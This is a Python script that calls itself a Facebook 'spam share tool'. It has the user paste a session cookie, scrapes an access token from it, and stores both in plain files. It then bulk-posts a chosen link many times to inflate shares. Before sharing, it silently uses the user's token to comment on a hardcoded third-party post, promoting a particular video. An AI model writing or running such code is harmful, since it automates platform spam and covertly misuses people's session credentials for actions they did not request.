import os,re,sys,bs4,time,json,random
import datetime,requests,rich,string
from os import system as lmnx9
from rich import print as Lmnx9
DTX={'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl=datetime.datetime.now().day
bln=DTX[(str(datetime.datetime.now().month))]
thn=datetime.datetime.now().year
lj_lmn=str(tgl)+" "+str(bln)+" "+str(thn)
ses=requests.Session()
	
def lmnx9_login():
    lmnx9('clear')
    Lmnx9(credit)
    cookie=input('[F] Paste Fresh Cookie : ')
    try:
        dark_XL=requests.get("https://business.facebook.com/business_locations",headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","cookie":cookie})
        token=re.search("(EAAG\w+)", dark_XL.text).group(1)
        if "EAAG" in str(token):
            open('cookie.txt','w').write(cookie)
            open('token.txt','w').write(token)
            Lmnx9("[~][bold green] Login Successful!!![bold white] ")
            bot(cookie)
    except AttributeError:
        Lmnx9("[~][bold red] Cookie Expired !![bold white]")
        time.sleep(4)
        lmnx9_login()
    except requests.exceptions.ConnectionError:
        exit("[~] [bold red] Connection error!![bold white]")
def bot(cookie):
    LijA=str(datetime.datetime.now().strftime('%H:%M:%S'))
    LiMoN={'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
    kuki=cookie
    toket=open("token.txt","r").read()
    respon=random.choice(['Keep up the spirit, bro','Cool, bro','Crazy, Master','My role model','Keep up the spirit'])
    kom=("\n\nhttps://www.facebook.com/gabowen.2004/videos/654953974141611/?app=fbl\n\n This Comment Was Written By A Bot")
    requests.post("https://graph.facebook.com/100089033379675_139149639062815/comments?message=" + respon + ""+ kom + "\n[ Pukul "+ LijA + " WIB ] "+ "\n- "+ LiMoN + ", "+ lj_lmn + " -" + "&access_token="+toket,headers={"cookie":kuki})
    lmnx9_share()
def lmnx9_share():
    lmnx9('clear')
    Lmnx9(credit)
    header={"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
    lija_xan=input(f"[~] Enter Post Link : ")
    lija_xans=int(input(f"[~] Share Limit : "))
    delay = int(input("[~] Set Delay ( 1 normal | 0 speed ) : "))
    Lmnx9('[~][bold green] Post Share Started...')
    cookie=open('cookie.txt', 'r').read()
    token=open('token.txt', 'r').read()
    coki={"cookie":cookie}
    try:
        for LmNx9 in range(lija_xans):
            LmNx9+=1
            ress=ses.post(f"https://graph.facebook.com/me/feed?link={lija_xan}&published=0&access_token={token}",headers=header, cookies=coki).json()
            time.sleep(delay)
            if "id" in ress:
                Lmnx9("[~][bold green] Successful Share : "+ress['id'])
                sys.stdout.flush()
            else:
                exit('[~] ERROR DATA\n')
        Lmnx9("[~] All Share Complete !!! ")
        input("[~] Press Enter To Back")
        lmnx9_share()
    except requests.exceptions.ConnectionError:
        exit('[~] Server Error !!! \n')
credit="""[bold white] RPW SPAM SHARE TOOL
[bold red]          ______                  ___       __ 
[bold white]         / __/ /  ___ ________   / _ )___  / /_
[bold red]        _\ \/ _ \/ _ `/ __/ -_) / _  / _ \/ __/
[bold white]       /___/_//_/\_,_/_/  \__/ /____/\___/\__/ 
[bold red]———————————————————————————————————————————————————————————[bold white]
[[bold yellow]>_[bold white]] FACEBOOK UNLIMITED SHARE POST V1
[[bold yellow]>_[bold white]] OWNER TOOLS : [bold green]Brian Cruz [bold white]
[[bold yellow]>_[bold white]] api-key - 1738478479
[[bold yellow]>_[bold white]] [bold red]Don't Use Main Facebook Account For Safety..!!!
[bold red]———————————————————————————————————————————————————————————[bold white]"""
if __name__ in '__main__':
    lmnx9_login()